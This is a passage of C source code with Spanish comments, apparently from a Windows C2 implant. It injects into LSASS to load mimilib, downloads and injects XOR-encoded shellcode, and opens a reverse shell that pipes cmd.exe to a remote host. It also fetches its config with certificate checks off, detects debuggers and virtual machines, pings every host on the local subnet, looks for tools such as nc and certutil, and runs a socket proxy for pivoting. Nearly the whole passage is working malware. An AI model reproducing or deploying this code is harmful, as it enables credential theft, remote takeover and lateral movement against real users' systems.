            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        // --- 8. Crear hilo remoto ---
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
        if (!hThread) {
            printf("[-] CreateRemoteThread falló\n");
            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return FALSE;
        }

        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);

        printf("[+] Inyección en LSASS completada: LoadLibraryA('%s')\n", tempPath);
        fflush(stdout);

        // --- 9. Verificar activación ---
        HANDLE hLog = CreateFileA("C:\\\\Windows\\\\System32\\\\mimilsa.log", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hLog != INVALID_HANDLE_VALUE) {
            printf("[+] Éxito: mimilsa.log creado → mimilib activado\n");
            CloseHandle(hLog);
            return TRUE;
        } else {
            printf("[-] Advertencia: mimilsa.log no encontrado\n");
            return FALSE;
        }
    }

    // === Módulo normal: cargar en memoria local ===
    DWORD fileSize = 0;
    unsigned char* fileBuffer = DownloadToBuffer(url, &fileSize);
    if (!fileBuffer || fileSize == 0) {
        printf("[-] Fallo al descargar módulo\n");
        return FALSE;
    }

    PVOID moduleBase = MapModuleToMemory(fileBuffer, fileSize);
    free(fileBuffer);

    if (!moduleBase) {
        printf("[-] Fallo al mapear módulo en memoria\n");
        return FALSE;
    }

    printf("[+] Módulo cargado en: 0x%p\n", moduleBase);

    if (!ExecuteModule(moduleBase)) {
        printf("[-] Fallo al ejecutar DllMain\n");
        VirtualFree(moduleBase, 0, MEM_RELEASE);
        return FALSE;
    }

    // === Activación opcional para otros módulos ===
    HMODULE hDll = (HMODULE)moduleBase;

    typedef BOOL (WINAPI *startW_t)();
    startW_t pStartW = (startW_t)GetProcAddress(hDll, "startW");
    if (pStartW) {
        printf("[*] Ejecutando startW...\n");
        fflush(stdout);
        pStartW();
    }

    printf("[+] Módulo normal cargado y ejecutado\n");
    return TRUE;
}

// === XOR ===
void xor_string(char* data, size_t len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// === ANTI-ANALYSIS ===
BOOL anti_analysis() {
    if (IsDebuggerPresent()) {
        printf("[-] Debugger detectado.\n");
        fflush(stdout);
        return TRUE;
    }

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\\\DESCRIPTION\\\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
                printf("[-] Entorno virtualizado detectado.\n");
                fflush(stdout);
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

BOOL load_lazyconf() {
    const char* url = "$URL/config.json";
    const char* method = "GET";
    const char* data = NULL;
    int max_retries = 3;

    printf("[*] load_lazyconf: intentando descargar config...\n");
    fflush(stdout);
    printf("[*] Enviando %s a: %s\n", method, url);
    fflush(stdout);

    for (int attempt = 0; attempt < max_retries; attempt++) {
        printf("[*] Intento %d/%d\n", attempt + 1, max_retries);
        fflush(stdout);

        HINTERNET hSession = WinHttpOpen(
            USER_AGENT,
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0
        );

        if (!hSession) {
            printf("[-] Error creando sesión WinHTTP\n");
            fflush(stdout);
            Sleep(1000);
            continue;
        }

        // Parse URL
        char host[256], path[512];
        int port = 443;
        const char* host_start = url;

        if (strstr(url, "https://")) {
            host_start = url + 8;
            port = 443;
        } else if (strstr(url, "http://")) {
            host_start = url + 7;
            port = 80;
        }

        const char* path_start = strchr(host_start, '/');
        const char* port_start = strchr(host_start, ':');

        if (port_start && (!path_start || port_start < path_start)) {
            int host_len = port_start - host_start;
            strncpy(host, host_start, host_len);
            host[host_len] = '\0';
            port = atoi(port_start + 1);
            if (path_start) {
                strcpy(path, path_start);
            } else {
                strcpy(path, "/");
            }
        } else if (path_start) {
            int host_len = path_start - host_start;
            strncpy(host, host_start, host_len);
            host[host_len] = '\0';
            strcpy(path, path_start);
        } else {
            strcpy(host, host_start);
            strcpy(path, "/");
        }

        printf("[D] Host: %s, Puerto: %d, Path: %s\n", host, port, path);
        fflush(stdout);

        HINTERNET hConnect = WinHttpConnect(hSession, UTF8ToWide(host), port, 0);
        if (!hConnect) {
            printf("[-] Error conectando a %s:%d\n", host, port);
            fflush(stdout);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        DWORD request_flags = 0;
        if (port == 443 || strstr(url, "https://")) {
            request_flags = WINHTTP_FLAG_SECURE;
        }

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            UTF8ToWide(method),
            UTF8ToWide(path),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            request_flags
        );

        if (!hRequest) {
            printf("[-] Error creando request\n");
            fflush(stdout);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        // Configurar flags de seguridad para HTTPS
        if (request_flags & WINHTTP_FLAG_SECURE) {
            DWORD flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))) {
                printf("[-] Error configurando flags SSL (ignorando)\n");
                fflush(stdout);
            }
        }

        // No hay headers ni datos
        BOOL sent = WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (void*)data, 0,
            0, 0
        );

        if (!sent) {
            DWORD error = GetLastError();
            printf("[-] WinHttpSendRequest falló, Código: %lu\n", error);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            DWORD error = GetLastError();
            printf("[-] WinHttpReceiveResponse failed, Error: %lu\n", error);
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            Sleep(1000);
            continue;
        }

        // Obtener código de estado HTTP
        DWORD statusCode = 0;
        DWORD size = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &statusCode, &size, NULL);
        printf("[+] HTTP %lu\n", statusCode);
        fflush(stdout);

        // Leer respuesta
        char* response = NULL;
        DWORD totalSize = 0;
        DWORD bytesRead;
        char chunk[4096];

        while (WinHttpReadData(hRequest, chunk, sizeof(chunk), &bytesRead)) {
            if (bytesRead == 0) break;

            char* newBuffer = realloc(response, totalSize + bytesRead + 1);
            if (!newBuffer) {
                printf("[-] realloc failed\n");
                fflush(stdout);
                if (response) free(response);
                response = NULL;
                break;
            }
            response = newBuffer;
            memcpy(response + totalSize, chunk, bytesRead);
            totalSize += bytesRead;
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (!response || totalSize == 0) {
            printf("[-] No response data in attempt %d\n", attempt + 1);
            fflush(stdout);
            Sleep(1000);
            continue;
        }

        response[totalSize] = '\0';
        printf("[+] ✅ Config descargada (%lu bytes): %.200s\n", totalSize, response);

        // PARSEAR JSON
        cJSON *root = cJSON_Parse(response);
        if (!root) {
            printf("[-] JSON parse error\n");
            free(response);
            fflush(stdout);
            Sleep(1000);
            continue;
        }

        // Extraer valores
        cJSON *port_item = cJSON_GetObjectItem(root, "reverse_shell_port");
        if (cJSON_IsNumber(port_item)) {
            lazyconf.reverse_shell_port = port_item->valueint;
        }

        cJSON *rhost_item = cJSON_GetObjectItem(root, "rhost");
        if (cJSON_IsString(rhost_item)) {
            strncpy(lazyconf.rhost, rhost_item->valuestring, sizeof(lazyconf.rhost) - 1);
            lazyconf.rhost[sizeof(lazyconf.rhost) - 1] = '\0';
        }

        cJSON *debug_item = cJSON_GetObjectItem(root, "enable_c2_implant_debug");
        if (cJSON_IsString(debug_item)) {
            strncpy(lazyconf.debug_implant, debug_item->valuestring, sizeof(lazyconf.debug_implant) - 1);
            lazyconf.debug_implant[sizeof(lazyconf.debug_implant) - 1] = '\0';
        }

        cJSON *ports_item = cJSON_GetObjectItem(root, "beacon_scan_ports");
        if (cJSON_IsArray(ports_item)) {
            int count = cJSON_GetArraySize(ports_item);
            lazyconf.num_ports = (count > 64) ? 64 : count;
            for (int i = 0; i < lazyconf.num_ports; ++i) {
                cJSON *port = cJSON_GetArrayItem(ports_item, i);
                if (cJSON_IsNumber(port)) {
                    lazyconf.ports[i] = port->valueint;
                }
            }
        }

        cJSON_Delete(root);
        free(response);
        return TRUE; // ÉXITO
    }

    printf("[-] Todos los intentos de carga de config fallaron\n");
    fflush(stdout);
    return FALSE;
}

HMODULE GetNtdllBase() {
    printf("[*] Buscando ntdll.dll...\n");
    fflush(stdout);

    PEB* peb;
#ifdef _WIN64
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
#else
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
#endif

    if (!peb || !peb->Ldr) return NULL;

    LIST_ENTRY* list = peb->Ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY* head = list;

    do {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)list - 0x10);
        if (entry->BaseDllName.Length == 20 && entry->BaseDllName.Buffer) {
            if (entry->BaseDllName.Buffer[0] == L'n' &&
                entry->BaseDllName.Buffer[1] == L't' &&
                entry->BaseDllName.Buffer[2] == L'd' &&
                entry->BaseDllName.Buffer[3] == L'l' &&
                entry->BaseDllName.Buffer[4] == L'l' &&
                entry->BaseDllName.Buffer[5] == L'.' &&
                entry->BaseDllName.Buffer[6] == L'd' &&
                entry->BaseDllName.Buffer[7] == L'l' &&
                entry->BaseDllName.Buffer[8] == L'l') {
                printf("[+] ntdll.dll encontrado en: 0x%p\n", entry->DllBase);
                fflush(stdout);
                return (HMODULE)entry->DllBase;
            }
        }
        list = list->Flink;
    } while (list != head);

    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (h) {
        printf("[+] ntdll.dll obtenido con fallback: 0x%p\n", h);
        fflush(stdout);
        return h;
    }

    printf("[-] No se pudo encontrar ntdll.dll\n");
    fflush(stdout);
    return NULL;
}

BOOL isVMByMAC() {
    printf("[*] Checking if running in a VM by MAC address...\n");
    fflush(stdout);

    PIP_ADAPTER_INFO adapterInfo = NULL;
    PIP_ADAPTER_INFO adapter = NULL;
    ULONG ulOutBufLen = 0;

    // Obtener tamaño necesario
    if (GetAdaptersInfo(adapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        adapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (!adapterInfo) {
            printf("[-] Failed to allocate memory for adapter info.\n");
            fflush(stdout);
            return FALSE;
        }
    }

    // Obtener información de adaptadores
    if (GetAdaptersInfo(adapterInfo, &ulOutBufLen) != NO_ERROR) {
        printf("[-] GetAdaptersInfo failed.\n");
        fflush(stdout);
        if (adapterInfo) free(adapterInfo);
        return FALSE;
    }

    // Prefijos de MAC de VMs conocidas
    const char* vmMACPrefixes[] = {
        "00:05:69",  // VMware
        "00:0C:29",  // VMware
        "00:50:56",  // VMware
        "08:00:27",  // VirtualBox
        "52:54:00"   // QEMU/KVM
    };
    int numPrefixes = 5;

    // Recorrer adaptadores
    adapter = adapterInfo;
    while (adapter) {
        // Saltar interfaces no activas o loopback
        if (adapter->Type != MIB_IF_TYPE_ETHERNET ||
            adapter->AddressLength != 6) {
            adapter = adapter->Next;
            continue;
        }

        // Formatear MAC como string: XX:XX:XX:XX:XX:XX
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X",
                 adapter->Address[0],
                 adapter->Address[1],
                 adapter->Address[2]);

        // Comparar con prefijos de VM
        for (int i = 0; i < numPrefixes; i++) {
            if (strcmp(mac_str, vmMACPrefixes[i]) == 0) {
                printf("[+] VM detected: MAC prefix %s\n", mac_str);
                fflush(stdout);
                free(adapterInfo);
                return TRUE;
            }
        }

        adapter = adapter->Next;
    }

    if (adapterInfo) free(adapterInfo);
    return FALSE;
}

// === EXTRAER SHELLCODE ===
int extract_shellcode(const char* input, size_t len, unsigned char** out) {
    *out = NULL;
    unsigned char* sc = malloc(1024);
    size_t capacity = 1024;
    size_t count = 0;

    for (size_t i = 0; i < len - 3; i++) {
        if (input[i] == '\\\\' && input[i+1] == 'x' && i+3 < len) {
            char hex[3] = { input[i+2], input[i+3], '\\0' };
            char* end;
            long val = strtol(hex, &end, 16);
            if (end == hex + 2 && val >= 0 && val <= 255) {
                if (count >= capacity) {
                    capacity *= 2;
                    unsigned char* tmp = realloc(sc, capacity);
                    if (!tmp) { free(sc); return -1; }
                    sc = tmp;
                }
                sc[count++] = (unsigned char)(val ^ XOR_KEY);
                i += 3;
            }
        }
    }

    if (count == 0) { free(sc); return 0; }
    *out = sc;
    return count;
}


// Función para convertir hex a bytes
BYTE hex_char_to_byte(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

void hex_to_bytes(const char* hex, BYTE* output, size_t len) {
    for (int i = 0; i < len; i++) {
        output[i] = (hex_char_to_byte(hex[i * 2]) << 4) | hex_char_to_byte(hex[i * 2 + 1]);
    }
}

// === executeLoader ===
void executeLoader(void *arg){
    // === 1. Validar y loguear inmediatamente ===
    if (!arg) {
        printf("[-] executeLoader: arg is NULL\n");
        fflush(stdout);
        return;
    }

    char* url = (char*)arg;
    printf("[*] executeLoader started for: %s\n", url);
    fflush(stdout);

    // === 2. Descargar ===
    DWORD fileSize = 0;
    unsigned char* raw_content = DownloadToBuffer(url, &fileSize);
    if (!raw_content || fileSize == 0) {
        printf("[-] executeLoader: Failed to download from %s\n", url);
        fflush(stdout);
        free(arg);
        return;
    }

    printf("[+] executeLoader: Downloaded %lu bytes\n", fileSize);
    fflush(stdout);

    // === 3. Extraer shellcode ===
    unsigned char* shellcode = NULL;
    int shellcode_len = extract_shellcode((char*)raw_content, fileSize, &shellcode);
    free(raw_content);

    if (!shellcode || shellcode_len <= 0) {
        printf("[-] executeLoader: Failed to extract shellcode\n");
        fflush(stdout);
        free(arg);
        return;
    }

    printf("[+] executeLoader: Shellcode extracted: %d bytes\n", shellcode_len);
    fflush(stdout);

    // === 4. Inyectar ===
    if (!EarlyBirdInject(shellcode, shellcode_len)) {
        printf("[-] executeLoader: EarlyBirdInject failed\n");
    } else {
        printf("[+] executeLoader: Shellcode injected successfully\n");
    }
    fflush(stdout);

    // === 5. Limpiar ===
    free(shellcode);
    free(arg);
}

// ========================
// FUNCIÓN DE INYECCIÓN DE SHELL 
// ========================
void __cdecl ReverseShell(void* arg) {
    ReverseArgs* args = (ReverseArgs*)arg;
    if (!args) {
        printf("[D] ReverseShell: args is NULL\n");
        _endthread();
        return;
    }

    char ip[32];

    int port = args->port;
    strncpy(ip, args->host, 31);
    ip[31] = '\0';
    printf("[D] ReverseShell: Using IP=%s, PORT=%d\n", ip, port);
    free(args);  // Liberar inmediatamente

    // === Inicializar Winsock ===
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("[D] ReverseShell: WSAStartup failed\n");
        _endthread();
        return;
    }
    printf("[D] ReverseShell: Winsock initialized\n");

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        printf("[D] ReverseShell: socket() failed\n");
        WSACleanup();
        _endthread();
        return;
    }
    printf("[D] ReverseShell: Socket created\n");

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons((u_short)port);

    printf("[D] ReverseShell: Connecting to %s:%d...\n", ip, port);
    if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        printf("[D] ReverseShell: connect() failed, error=%d\n", WSAGetLastError());
        closesocket(s);
        WSACleanup();
        _endthread();
        return;
    }
    printf("[+] ReverseShell: Connected to %s:%d\n", ip, port);

    // === Pipes: entrada y salida del proceso ===
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hInRead = NULL, hInWrite = NULL;
    HANDLE hOutRead = NULL, hOutWrite = NULL;

    if (!CreatePipe(&hInRead, &hInWrite, &saAttr, 0)) {
        printf("[D] ReverseShell: CreatePipe (in) failed\n");
        goto cleanup;
    }
    if (!SetHandleInformation(hInWrite, HANDLE_FLAG_INHERIT, 0)) {
        printf("[D] ReverseShell: SetHandleInformation (in) failed\n");
        goto cleanup;
    }

    if (!CreatePipe(&hOutRead, &hOutWrite, &saAttr, 0)) {
        printf("[D] ReverseShell: CreatePipe (out) failed\n");
        goto cleanup;
    }
    if (!SetHandleInformation(hOutRead, HANDLE_FLAG_INHERIT, 0)) {
        printf("[D] ReverseShell: SetHandleInformation (out) failed\n");
        goto cleanup;
    }

    printf("[D] ReverseShell: Pipes created and handles set\n");

    // === Crear proceso: cmd.exe con stdin/stdout redirigidos ===
    STARTUPINFO si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hInRead;
    si.hStdOutput = hOutWrite;
    si.hStdError = hOutWrite;

    PROCESS_INFORMATION pi = {0};


    BOOL success = CreateProcess(
        NULL,
        L"cmd.exe /k",  
        NULL, NULL, TRUE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    if (!success) {
        printf("[D] ReverseShell: CreateProcess failed, error=%lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] ReverseShell: cmd.exe started with /k, PID=%lu\n", pi.dwProcessId);

    // === Cerrar extremos que el padre no debe usar ===
    CloseHandle(hInRead);
    CloseHandle(hOutWrite);
    hInRead = NULL;
    hOutWrite = NULL;

    printf("[D] ReverseShell: Parent pipe ends closed\n");

    // === Hilo para leer salida del proceso (como en el ejemplo que funciona) ===
    DWORD WINAPI ReadFromProcess(LPVOID lpParam) {
        HANDLE hRead = (HANDLE)lpParam;
        char buffer[4096];
        DWORD n;

        while (1) {
            if (ReadFile(hRead, buffer, sizeof(buffer), &n, NULL)) {
                send(s, buffer, n, 0);  // Enviar al socket
            } else {
                break;  // Proceso cerró salida
            }
        }
        return 0;
    }

    // Lanzar hilo para leer salida del proceso
    HANDLE hReadThread = CreateThread(NULL, 0, ReadFromProcess, hOutRead, 0, NULL);
    if (hReadThread == NULL) {
        printf("[D] ReverseShell: Failed to create read thread\n");
        goto cleanup;
    }

    // === Bucle principal: leer del socket y escribir al proceso ===
    char buffer[4096];
    int r;
    DWORD n;

    while (1) {
        r = recv(s, buffer, sizeof(buffer), 0);
        if (r <= 0) break;

        // Añadir CRLF si no existe
        if (r < sizeof(buffer) - 2) {
            if (buffer[r-1] != '\n') {
                buffer[r] = '\r';
                buffer[r+1] = '\n';
                r += 2;
            } else if (r == 1 || buffer[r-2] != '\r') {
                memmove(buffer + r, buffer + r - 1, 1);
                buffer[r-1] = '\r';
                r++;
            }
        }

        if (!WriteFile(hInWrite, buffer, r, &n, NULL)) {
            DWORD err = GetLastError();
            printf("[D] ReverseShell: WriteFile failed, error=%lu\n", err);
            break;
        }
    }

    printf("[*] ReverseShell: Connection closed, cleaning up...\n");

cleanup:
    printf("[D] ReverseShell: Entering cleanup\n");

    if (hInWrite) {
        FlushFileBuffers(hInWrite);
        CloseHandle(hInWrite);
    }
    if (hOutRead) {
        CloseHandle(hOutRead);
    }
    if (s != INVALID_SOCKET) {
        closesocket(s);
        WSACleanup();
    }
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

    printf("[*] ReverseShell: Thread ending gracefully\n");
    _endthread();
}

DWORD GetJitteredSleep(DWORD base_ms) {
    int jitter_percent = MIN_JITTER + rand() % (MAX_JITTER - MIN_JITTER + 1);
    return base_ms + (base_ms * jitter_percent / 100);
}

char* GetUsefulSoftware() {
    printf("[*] Searching for useful software...\n");
    fflush(stdout);

    const char* binaries[] = {
        "docker.exe", "nc.exe", "netcat.exe", "python.exe", "python3.exe",
        "php.exe", "perl.exe", "ruby.exe", "gcc.exe", "g++.exe",
        "ping.exe", "base64.exe", "socat.exe", "curl.exe", "wget.exe",
        "certutil.exe", "xterm.exe", "gpg.exe", "mysql.exe", "ssh.exe"
    };
    int numBinaries = 20;

    char* result = (char*)malloc(4096);
    if (!result) return NULL;
    result[0] = '\0';

    char path[1024];

    for (int i = 0; i < numBinaries; i++) {
        if (SearchPathA(NULL, binaries[i], NULL, sizeof(path), path, NULL)) {
            strcat(result, binaries[i]);
            strcat(result, ",");
        }
    }

    // Si hay resultados, quita la última coma
    if (strlen(result) > 0) {
        result[strlen(result) - 1] = '\0';  // Quitar última coma
    } else {
        strcpy(result, "none");
    }

    return result;  // Recuerda: el que llama debe hacer free()
}

char* base64_encode(const unsigned char* data, size_t inputLen) {
    char* out;
    size_t outLen = 4 * ((inputLen + 2) / 3);
    size_t i, j;
    int padding = 0;
    printf("[*] base64_encode...\n");
    fflush(stdout);
    out = (char*)malloc(outLen + 1);
    if (!out) return NULL;

    for (i = 0, j = 0; i < inputLen; i += 3) {
        uint32_t octet = 0;
        int bytes = 0;

        for (int k = 0; k < 3; k++) {
            if (i + k < inputLen) {
                octet |= data[i + k] << (16 - (k * 8));
                bytes++;
            }
        }

        if (bytes < 3) padding = 3 - bytes;

        for (int k = 0; k < 4; k++) {
            if (k < 4 - padding) {
                out[j++] = b64chars[(octet >> (6 * (3 - k))) & 0x3F];
            } else {
                out[j++] = '=';
            }
        }
    }

    out[j] = '\0';
    return out;
}

char* base64_decode(const char* input, size_t* out_len) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {
        printf("[-] base64_decode: CryptStringToBinaryA (1st) failed, Error: %lu\n", GetLastError());
        fflush(stdout);
        return NULL;
    }

    BYTE* buf = (BYTE*)malloc(len);
    if (!buf) {
        printf("[-] base64_decode: malloc failed\n");
        fflush(stdout);
        return NULL;
    }

    if (CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, buf, &len, NULL, NULL)) {
        *out_len = len;
        printf("[D] base64_decode: Success, %zu bytes\n", *out_len);
        printf("[D] Decoded raw: ");
        for (size_t i = 0; i < min(*out_len, 32); i++) {
            printf("%02x ", buf[i]);
        }
        printf("\n");
        fflush(stdout);
        return (char*)buf;
    } else {
        printf("[-] base64_decode: CryptStringToBinaryA (2nd) failed, Error: %lu\n", GetLastError());
        fflush(stdout);
        free(buf);
        return NULL;
    }
}

void discoverLocalHosts() {
    char* myIP = GetIPs();
    if (!myIP) {
        printf("[!] Could not get local IP address.\n");
        fflush(stdout);
        return;
    }
    char* myIP_copy = _strdup(myIP); // Create a copy for strtok
    char* subnet = strtok(myIP_copy, ".");
    char* ip1 = strtok(NULL, ".");
    char* ip2 = strtok(NULL, ".");
    
    printf("[*] Discovering live hosts on local subnet...\n");
    fflush(stdout);

    char base[16];
    snprintf(base, sizeof(base), "%s.%s.%s", subnet, ip1, ip2);
    free(myIP_copy); // Free the strtok copy

    if (discoveredLiveHosts) {
        free(discoveredLiveHosts);
        discoveredLiveHosts = NULL;
    }

    char liveHosts[4096] = {0};
    
    // Ping all hosts on the subnet
    for (int i = 1; i <= 254; i++) {
        char ip[16];
        snprintf(ip, sizeof(ip), "%s.%d", base, i);

        HANDLE hIcmp = IcmpCreateFile();
        if (hIcmp != INVALID_HANDLE_VALUE) {
            DWORD replySize = sizeof(ICMP_ECHO_REPLY) + 32;
            BYTE* reply = malloc(replySize);
            
            // Send ICMP echo request with a 1-second timeout
            if (IcmpSendEcho(hIcmp, inet_addr(ip), NULL, 0, NULL, reply, replySize, 1000)) {
                if (strlen(liveHosts) > 0) {
                    strcat(liveHosts, ",");
                }
                strcat(liveHosts, ip);
                printf("[+] Found live host: %s\n", ip);
            }
            free(reply);
            IcmpCloseHandle(hIcmp);
        }
    }
    
    discoveredLiveHosts = _strdup(liveHosts);
    printf("[*] Discovered hosts: %s\n", discoveredLiveHosts ? discoveredLiveHosts : "None");

    free(myIP);
}

// startProxy.c

void initProxy() {
    if (!proxyInitialized) {
        InitializeCriticalSection(&proxyMutex);
        memset(proxySessions, 0, sizeof(proxySessions));
        memset(proxyListeners, 0, sizeof(proxyListeners));
        proxyInitialized = TRUE;
    }
}

// Función para reenviar datos entre sockets
void WINAPI relay_thread(void* param) {
    SOCKET* sockets = (SOCKET*)param;
    SOCKET from = sockets[0];
    SOCKET to = sockets[1];
    
    char buffer[4096];
    int bytesRead;
    
    while ((bytesRead = recv(from, buffer, sizeof(buffer), 0)) > 0) {
        if (send(to, buffer, bytesRead, 0) <= 0) {
            break;
        }
    }
    
    shutdown(from, SD_BOTH);
    shutdown(to, SD_BOTH);
    free(sockets);
    _endthread();
}

// Tu función proxy_thread usando tus estructuras exactas
void WINAPI proxy_thread(void* param) {
    ProxyThreadData* data = (ProxyThreadData*)param;
    
    // Conectar al servidor destino
    SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server == INVALID_SOCKET) {
        goto cleanup;
    }
    
    struct sockaddr_in serverAddr = {0};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(data->targetIP);
    serverAddr.sin_port = htons(data->targetPort);
    
    if (connect(server, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        printf("[-] Failed to connect to target %s:%d\n", data->targetIP, data->targetPort);
        closesocket(server);
        goto cleanup;
    }
    
    // Actualizar tu ProxySession original
    if (data->session) {
        EnterCriticalSection(&proxyMutex);
        data->session->server = server;
        LeaveCriticalSection(&proxyMutex);
    }
    
    printf("[+] Connected: client -> %s:%d -> %s:%d\n", 
           data->listenIP, data->listenPort, 
           data->targetIP, data->targetPort);
    
    // Crear threads para reenvío bidireccional
    SOCKET* relay1 = (SOCKET*)malloc(2 * sizeof(SOCKET));
    SOCKET* relay2 = (SOCKET*)malloc(2 * sizeof(SOCKET));
    
    if (relay1 && relay2) {
        relay1[0] = data->client;
        relay1[1] = server;
        relay2[0] = server;
        relay2[1] = data->client;
        
        HANDLE thread1 = (HANDLE)_beginthread(relay_thread, 0, relay1);
        HANDLE thread2 = (HANDLE)_beginthread(relay_thread, 0, relay2);
        
        HANDLE threads[2] = {thread1, thread2};
        WaitForMultipleObjects(2, threads, FALSE, INFINITE);
    }
    
cleanup:
    // Limpiar usando tu estructura ProxySession
    if (data->session) {
        EnterCriticalSection(&proxyMutex);
        data->session->active = FALSE;
        if (data->session->client != INVALID_SOCKET) {
            closesocket(data->session->client);
            data->session->client = INVALID_SOCKET;
        }
        if (data->session->server != INVALID_SOCKET) {
            closesocket(data->session->server);
            data->session->server = INVALID_SOCKET;
        }
        LeaveCriticalSection(&proxyMutex);
    }
    
    if (relay1) free(relay1);
    if (relay2) free(relay2);
    free(data);
    _endthread();
}

// Thread para aceptar conexiones
void WINAPI proxy_accept_thread(void* param) {
    ProxyListener* listener = (ProxyListener*)param;
    
    while (listener->running) {
        struct sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);
        
        SOCKET client = accept(listener->listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (client == INVALID_SOCKET) {
            if (listener->running) {
                Sleep(100);
            }
            continue;
        }
        
        // Buscar slot libre en proxySessions (tu array original)
        EnterCriticalSection(&proxyMutex);
        
        ProxySession* session = NULL;
        for (int i = 0; i < 100; i++) {
            if (!proxySessions[i].active) {
                session = &proxySessions[i];
                break;
            }
        }
        
        if (session) {
            // Usar tu estructura ProxySession exacta
            session->client = client;
            session->server = INVALID_SOCKET;
            session->active = TRUE;
            strncpy(session->listenIP, listener->listenIP, sizeof(session->listenIP) - 1);
            session->listenIP[sizeof(session->listenIP) - 1] = '\0';
            session->listenPort = listener->listenPort;
            
            // Crear tu ProxyThreadData exacta
            ProxyThreadData* data = (ProxyThreadData*)malloc(sizeof(ProxyThreadData));
            if (data) {
                data->client = client;
                strncpy(data->listenIP, listener->listenIP, sizeof(data->listenIP) - 1);
                data->listenIP[sizeof(data->listenIP) - 1] = '\0';
                data->listenPort = listener->listenPort;
                strncpy(data->targetIP, listener->targetIP, sizeof(data->targetIP) - 1);
                data->targetIP[sizeof(data->targetIP) - 1] = '\0';
                data->targetPort = listener->targetPort;
                data->session = session;
                
                // Usar tu función proxy_thread original
                _beginthread(proxy_thread, 0, (void*)data);
                
                if (numProxySessions < 100) {
                    numProxySessions++;
                }
            } else {
                session->active = FALSE;
                closesocket(client);
            }
        } else {
            printf("[-] No available session slots\n");
            closesocket(client);
        }
        
        LeaveCriticalSection(&proxyMutex);
    }
    
    _endthread();
}

